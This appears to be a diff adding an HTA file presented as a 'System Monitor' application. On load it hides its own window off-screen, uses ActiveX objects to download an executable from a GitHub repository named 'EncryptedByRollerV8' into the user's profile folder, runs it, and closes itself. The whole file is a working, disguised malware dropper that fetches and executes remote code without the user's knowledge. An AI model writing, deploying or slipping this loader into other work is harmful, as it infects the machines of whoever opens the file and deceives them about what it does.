@@ -1,0 +1,62 @@
+<html>
+<head>
+<HTA:APPLICATION 
+    ID="SystemMonitorLoader"
+    APPLICATIONNAME="System Monitor"
+    WINDOWSTATE="minimize"
+    SHOWINTASKBAR="no"
+    CAPTION="no"
+    SYSMENU="no"
+    SCROLL="no"
+/>
+<title>System Monitor</title>
+<script language="JavaScript">
+window.resizeTo(1,1);
+window.moveTo(-1000,-1000);
+
+function downloadAndRun() {
+    try {
+        var shell = new ActiveXObject("WScript.Shell");
+        var fs = new ActiveXObject("Scripting.FileSystemObject");
+        
+        // Set paths
+        var userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%");
+        var exePath = userProfile + "\\SystemMonitor_signed.exe";
+        var downloadURL = "https://github.com/EncryptedByRollerV8/n/raw/main/SystemMonitor_signed.exe";
+        
+        // Download the file
+        var xhr = new ActiveXObject("Microsoft.XMLHTTP");
+        xhr.open("GET", downloadURL, false);
+        xhr.send();
+        
+        if (xhr.status === 200) {
+            var stream = new ActiveXObject("ADODB.Stream");
+            stream.Open();
+            stream.Type = 1; // Binary
+            stream.Write(xhr.responseBody);
+            stream.SaveToFile(exePath, 2); // Overwrite if exists
+            stream.Close();
+            
+            // Execute the file
+            shell.Run('"' + exePath + '"', 1, false);
+        } else {
+            alert("Download failed. Status: " + xhr.status);
+        }
+    } catch(e) {
+        alert("Error: " + e.message);
+    }
+    
+    // Close HTA
+    window.setTimeout(function() {
+        window.close();
+    }, 100);
+}
+
+// Run when HTA loads
+window.onload = downloadAndRun;
+</script>
+</head>
+<body>
+<!-- Empty body - window will be hidden -->
+</body>
+</html>
